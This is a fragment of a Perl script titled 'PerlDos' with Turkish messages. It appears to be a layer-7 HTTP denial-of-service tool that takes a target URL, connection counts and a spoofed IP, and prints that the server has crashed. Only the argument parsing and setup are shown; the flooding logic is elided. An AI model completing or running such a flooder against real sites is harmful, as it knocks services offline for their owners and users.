...
sub layer7 {
    $SIG{'KILL'} = sub { print "Sunucu Cokmustur...\n"; threads->exit(); };
    $url = $ARGV[0];
    print "Socket Acilmistir.\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
    ...
    if($url !~ /^http:\/\//) {
        die("[3HT] Lutfen Adresi Dogru Giriniz.!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $peerto = 80;
...
if($#ARGV > 2) {
    ...
    die("Coded | MBE Software - PerlDos* | Kulanim: NaTWeb.pl <http://ornek.com> <10000> <50> <100>\n");
}
